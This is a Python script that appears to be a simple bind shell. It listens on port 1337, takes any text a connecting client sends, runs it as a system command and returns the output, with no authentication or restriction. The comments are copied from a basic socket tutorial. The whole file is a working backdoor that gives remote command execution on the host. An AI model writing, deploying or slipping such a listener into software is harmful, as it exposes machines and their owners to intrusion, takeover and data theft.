import socket
import os
import subprocess

def server_program():
    # get the hostname
    host = socket.gethostname()
    port = 1337  # initiate port no above 1024

    server_socket = socket.socket()  # get instance
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    # configure how many client the server can listen simultaneously
    server_socket.listen(1)
    conn, address = server_socket.accept()  # accept new connection
    print("Connection from: " + str(address))
    while True:
        # receive data stream. it won't accept data packet greater than 1024 bytes
        data = conn.recv(1024).decode()
        if not data:
            # if data is not received break
            break
        print("from connected user: " + str(data))
        command = str(data)
        result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout_output = result.stdout.decode("utf-8")
        stderr_output = result.stderr.decode("utf-8")
        res = stdout_output
        conn.send(res.encode())  # send data to the client

    conn.close()  # close the connection


if __name__ == '__main__':
    server_program()